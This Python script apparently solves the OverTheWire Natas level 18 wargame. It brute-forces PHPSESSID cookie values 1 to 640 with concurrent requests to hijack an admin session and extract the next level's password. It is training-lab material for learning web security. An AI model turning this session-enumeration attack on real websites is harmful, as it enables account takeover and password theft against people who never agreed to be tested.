#!/usr/bin/env python3
import asyncio
import re
from aiohttp import BasicAuth, ClientSession


url = 'http://natas18.natas.labs.overthewire.org/'
auth = BasicAuth('natas18', natas18_pass)

def split_chunks(xrange, n):
    for i in range(0, xrange.stop, n):
        yield xrange[i:i+n]

async def check_id(session_id):
    cookies = {'PHPSESSID': str(session_id)}
    async with ClientSession() as session:
        async with session.get(url, auth=auth, cookies=cookies) as response:
            r = await response.text()
            if 'Username: natas19' in r:
                password_re = re.compile('Password: (?P<password>[a-zA-Z0-9]{32})')
                password = password_re.search(r).groupdict()['password']
                return password

async def main(chunks=100):
    tasks = []
    for i in split_chunks(range(1, 640+1), chunks):
        for j in i:
            tasks.append(asyncio.ensure_future(check_id(j)))
            # Add delay to prevent too many simultaneous requests
            # Increase delay if receiving connection refused error
            # await asyncio.sleep(0.01)
        for task in asyncio.as_completed(tasks):
            if password := await task:
                for t in tasks:
                    t.cancel()
                return password


if __name__ == '__main__':
    # Amount of session ids to check at a time
    increment = 100
    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(main(increment))
    loop.run_until_complete(future)
    print(future.result())
